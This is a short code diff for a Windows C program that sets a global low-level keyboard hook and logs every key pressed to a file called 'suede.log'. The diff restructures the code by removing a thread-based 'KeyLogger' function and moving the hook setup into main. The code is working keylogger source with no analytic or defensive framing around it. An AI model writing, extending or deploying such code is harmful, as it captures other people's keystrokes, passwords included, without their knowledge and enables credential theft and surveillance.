@@ -9,11 +9,11 @@ KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
     ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
   ) {
     KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
-    DWORD dwMsg = 1;
-    dwMsg += hooked->scanCode << 16;
-    dwMsg += hooked->flags << 24;
+    DWORD mesg = 1;
+    mesg += hooked->scanCode << 16;
+    mesg += hooked->flags << 24;
     char kn[] = "Windows Right";
-    GetKeyNameText(dwMsg, kn, sizeof kn);
+    GetKeyNameText(mesg, kn, sizeof kn);
     FILE * fpt = fopen("suede.log", "a");
     fprintf(fpt, "_%s", kn);
     fflush(fpt);
@@ -21,23 +21,13 @@ KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
   return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
-void MsgLoop() {
+int main() {
+  HINSTANCE hExe = GetModuleHandle(0);
+  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, hExe, 0);
   MSG mg;
   while (GetMessage(&mg, 0, 0, 0)) {
     TranslateMessage(&mg);
     DispatchMessage(&mg);
   }
-}
-
-DWORD WINAPI KeyLogger() {
-  HINSTANCE hExe = GetModuleHandle(0);
-  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, hExe, 0);
-  MsgLoop();
-  UnhookWindowsHookEx(hKeyHook);
   return 0;
-}
-
-int main() {
-  HANDLE thd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) KeyLogger, 0, 0, 0);
-  return WaitForSingleObject(thd, INFINITE);
 }
